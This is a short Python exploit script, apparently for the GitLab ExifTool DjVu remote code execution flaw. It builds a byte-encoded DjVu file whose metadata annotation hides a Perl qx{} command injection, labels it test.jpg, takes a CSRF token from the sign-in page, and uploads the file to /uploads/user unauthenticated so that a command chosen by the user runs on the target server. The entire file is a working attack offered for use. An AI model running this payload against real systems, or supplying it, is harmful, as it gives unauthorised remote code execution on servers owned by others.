import sys
import re
import requests


target = sys.argv[1]
command = sys.argv[2]
session = requests.session()
CSRF_PATTERN = re.compile(rb'csrf-token" content="(.*?)" />')

def get_payload(command):
    rce_payload = b'\x41\x54\x26\x54\x46\x4f\x52\x4d'
    rce_payload += (len(command) + 0x55).to_bytes(length=4, byteorder='big', signed=True)
    rce_payload += b'\x44\x4a\x56\x55\x49\x4e\x46\x4f\x00\x00\x00\x0a\x00\x00\x00\x00\x18\x00\x2c\x01\x16\x01\x42\x47\x6a\x70\x00\x00\x00\x00\x41\x4e\x54\x61'
    rce_payload += (len(command) + 0x2f).to_bytes(length=4, byteorder='big', signed=True)
    rce_payload += b'\x28\x6d\x65\x74\x61\x64\x61\x74\x61\x0a\x09\x28\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x20\x22\x5c\x0a\x22\x20\x2e\x20\x71\x78\x7b'
    rce_payload += command.encode()
    rce_payload += b'\x7d\x20\x2e\x20\x5c\x0a\x22\x20\x62\x20\x22\x29\x20\x29\x0a'
    return rce_payload

def csrf_token():
    response = session.get(f'{target}/users/sign_in', headers={'Origin': target})
    g = CSRF_PATTERN.search(response.content)
    assert g, 'No CSRF Token found'

    return g.group(1).decode()


def exploit():
    files = [('file', ('test.jpg', get_payload(command), 'image/jpeg'))]
    session.post(f'{target}/uploads/user', files=files, headers={'X-CSRF-Token': csrf_token()})


if __name__ == '__main__':
    exploit()
    print('finish test')
